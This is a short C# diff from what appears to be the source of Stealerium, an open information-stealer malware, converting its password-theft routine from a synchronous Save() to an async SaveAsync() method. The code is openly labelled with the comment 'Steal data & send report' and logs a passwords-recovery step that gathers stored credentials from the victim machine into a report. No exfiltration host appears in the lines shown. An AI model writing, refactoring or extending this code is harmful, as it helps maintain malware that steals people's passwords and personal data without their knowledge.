@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Threading.Tasks;
 using Stealerium.Stub.Helpers;
 using Stealerium.Stub.Target.System;
 
@@ -13,14 +14,14 @@ namespace Stealerium.Stub.Target
             $"{SystemInfo.Username}@{SystemInfo.Compname}_{SystemInfo.Culture}");
 
         // Steal data & send report
-        public static string Save()
+        public static async Task<string> SaveAsync()
         {
             Logging.Log("Running passwords recovery...");
 
             try
             {
                 PreparePasswordStoreDirectory();
-                return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : string.Empty;
+                return await Report.CreateReportAsync(PasswordsStoreDirectory) ? PasswordsStoreDirectory : string.Empty;
             }
             catch (Exception ex)
             {
